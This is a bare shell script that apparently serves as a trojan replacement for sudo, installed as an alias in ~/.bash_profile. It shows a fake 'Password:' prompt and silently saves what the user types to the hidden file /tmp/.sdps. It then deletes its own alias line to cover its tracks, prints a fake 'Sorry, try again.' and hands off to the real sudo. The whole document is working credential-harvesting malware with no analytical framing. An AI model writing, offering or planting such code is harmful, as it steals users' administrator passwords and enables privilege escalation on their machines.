echo -n "Password:";
read -s password;
echo \"${password}\" > /tmp/.sdps;
if [ ! -z "${password}" ]; then
	sed -i '' '/alias sudo="echo -n/d' ~/.bash_profile;
fi;
printf "\n";
echo "Sorry, try again.";
sudo $@